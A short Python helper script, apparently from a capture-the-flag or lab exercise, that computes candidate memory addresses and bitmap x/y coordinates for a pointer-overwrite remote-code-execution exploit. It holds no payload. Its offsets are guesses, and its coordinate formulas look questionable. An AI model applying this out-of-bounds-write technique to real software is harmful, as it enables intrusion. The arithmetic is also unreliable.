#!/usr/bin/env python3
"""
Calculate addresses and coordinates for RCE exploit
"""

targetaddr = 324521456  # 0x1355F5F0

print("=== Address Calculation ===")
print(f"Target string address: 0x{targetaddr:x} ({targetaddr})")
print()

# Entry address candidates
print("Entry address candidates (variable entry is before string):")
entry_candidates = [
    ("candidate1", targetaddr - 0x200),
    ("candidate2", targetaddr - 0x300),
    ("candidate3", targetaddr - 0x400),
]

for name, addr in entry_candidates:
    value_ptr = addr + 0x28
    print(f"  {name}: 0x{addr:x} ({addr})")
    print(f"    value_ptr: 0x{value_ptr:x} ({value_ptr})")

print()
print("Bitmap buffer candidates:")
print("  Option A: Bitmap after variables (targetaddr + offset)")
bitmap_after = [
    ("+0x800", targetaddr + 0x800),
    ("+0x1000", targetaddr + 0x1000),
    ("+0x2000", targetaddr + 0x2000),
]
for name, addr in bitmap_after:
    print(f"    {name}: 0x{addr:x} ({addr})")

print()
print("  Option B: Bitmap before variables (targetaddr - offset)")
bitmap_before = [
    ("-0x1000", targetaddr - 0x1000),
    ("-0x2000", targetaddr - 0x2000),
    ("-0x3000", targetaddr - 0x3000),
]
for name, addr in bitmap_before:
    print(f"    {name}: 0x{addr:x} ({addr})")

print()
print("=== Testing Combinations ===")
print("Testing entry_candidate2 (targetaddr - 0x300) with different bitmap positions:")

entry_addr = targetaddr - 0x300
value_ptr_addr = entry_addr + 0x28

int64_max = 9223372036854775807

for bitmap_name, bitmap_data_ptr in [("+0x1000", targetaddr + 0x1000), 
                                      ("-0x1000", targetaddr - 0x1000),
                                      ("-0x2000", targetaddr - 0x2000)]:
    offset = value_ptr_addr - bitmap_data_ptr
    bit_offset = offset * 8
    y = bit_offset // int64_max
    x = bit_offset % 8
    
    print(f"\nBitmap {bitmap_name} (0x{bitmap_data_ptr:x}):")
    print(f"  offset: {offset} (0x{offset:x})")
    print(f"  bit_offset: {bit_offset}")
    print(f"  y: {y}, x: {x}")
    
    if y >= 0 and x >= 0:
        print(f"  ✅ VALID COORDINATES!")
    else:
        print(f"  ❌ Invalid (negative coordinates)")

print()
print("=== Recommended Combination ===")
print("If bitmap is before variables, try:")
bitmap_data_ptr = targetaddr - 0x2000
offset = value_ptr_addr - bitmap_data_ptr
bit_offset = offset * 8
y = bit_offset // int64_max
x = bit_offset % 8
print(f"  entry_addr: 0x{entry_addr:x}")
print(f"  value_ptr_addr: 0x{value_ptr_addr:x}")
print(f"  bitmap_data_ptr: 0x{bitmap_data_ptr:x}")
print(f"  offset: {offset} (0x{offset:x})")
print(f"  y: {y}, x: {x}")

